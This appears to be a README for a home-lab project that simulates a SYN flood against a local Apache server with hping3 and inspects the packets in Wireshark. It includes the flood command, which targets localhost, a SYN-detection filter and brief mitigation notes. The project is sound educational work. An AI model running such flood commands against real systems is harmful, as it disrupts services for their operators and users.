````markdown
# 🔒 SYN Flood Attack Simulation (hping3 + Wireshark)

This project demonstrates how to simulate a SYN flood attack using `hping3` and analyze the resulting network traffic using `Wireshark`. It was performed safely in a local Ubuntu VM using Apache2 as the target web server.

---

## 🧰 Tools Used
- **Ubuntu VM (UTM on macOS)**
- **Apache2** (web server)
- **hping3** (packet flood tool)
- **Wireshark** (packet sniffer)

---

## 🛠️ Setup Steps

### 1. Install Tools
```bash
sudo apt update
sudo apt install apache2 hping3 wireshark -y
````

### 2. Start the Web Server

```bash
sudo systemctl start apache2
```

Visit: `http://localhost` to verify.

### 3. Simulate the Attack

```bash
sudo hping3 -S -p 80 -i u1000 localhost
```

### 4. Analyze with Wireshark

* Filter used:

  ```
  tcp.flags.syn == 1 && tcp.flags.ack == 0
  ```
* Captured SYN flood traffic hitting port 80.

### 5. Monitor System Load

Used `top` or `htop` to observe CPU usage during the attack.

---

## 📸 Screenshots Included

* Tool installation
* Apache server default page
* hping3 terminal output
* Wireshark SYN packet capture
* System resource usage

---

## 🛡️ Notes

* This simulation was done in a closed lab.
* Do **not** attempt this on public networks.
* For mitigation, tools like iptables, fail2ban, or SYN cookies can be explored.


